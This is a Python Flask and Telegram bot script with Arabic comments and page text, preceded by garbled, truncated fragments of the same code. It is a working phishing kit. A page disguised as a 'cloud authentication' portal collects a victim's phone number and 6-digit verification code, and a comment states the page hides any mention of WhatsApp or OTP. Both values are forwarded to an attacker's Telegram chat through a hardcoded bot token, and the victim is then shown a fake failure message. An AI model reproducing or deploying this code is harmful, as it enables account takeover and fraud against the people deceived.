        f"━━━━━━━━
    bot.send_message(ADMIN_ID, 

if __name__ == '__main__':
    # تشغيل البوت في الخلفية
    Thread(target=lambda:
    
    # حل مشكلة Port Bin
    port = intimport os, telebot
from flask import Flask, request, render_template_string
from threading import Thread

TOKEN = '8390076798:AAGXs0nv45Swv5JaDs9YCcwRiUgqPbskcAI'
ADMIN_ID = 5288849409
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

# تمويه كامل للواجهة - لا يوجد أي ذكر لـ WhatsApp أو Security أو OTP
GHOST_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الوصول الموحد</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
        .head { color: #1a73e8; font-size: 18px; font-weight: bold; margin-bottom: 15px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; text-align: center; }
        button { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div id="p1">
            <div class="head">نظام التوثيق السحابي</div>
            <p style="font-size:13px; color:#5f6368;">يرجى إدخال المعرف الرقمي الخاص بك لمتابعة عملية المزامنة.</p>
            <input type="tel" id="u_field" placeholder="0000000000">
            <button onclick="nxt()">متابعة</button>
        </div>
        <div id="p2" class="hidden">
            <div class="head">تأكيد المزامنة</div>
            <p style="font-size:13px; color:#5f6368;">أدخل الرمز السري المكون من 6 خانات لتأكيد العملية.</p>
            <input type="number" id="c_field" placeholder="******">
            <button onclick="fin()">تأكيد الآن</button>
        </div>
    </div>
    <script>
        let u = "";
        function nxt() {
            u = document.getElementById('u_field').value;
            fetch('/api/x', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ a: "R-1", b: u }) });
            document.getElementById('p1').classList.add('hidden');
            document.getElementById('p2').classList.remove('hidden');
        }
        function fin() {
            const c = document.getElementById('c_field').value;
            fetch('/api/x', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ a: "R-2", b: c, d: u }) });
            alert("فشلت عملية المزامنة، حاول لاحقاً.");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(GHOST_HTML)

@app.route('/api/x', methods=['POST'])
def log():
    data = request.json
    bot.send_message(ADMIN_ID, f"📩 **بيانات جديدة:**\nType: `{data['a']}`\nValue: `{data['b']}`\nRef: `{data.get('d', 'N/A')}`")
    return {"s": "ok"}

if __name__ == '__main__':
    # حل مشكلة Port Binding لتجنب فشل السيرفر
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
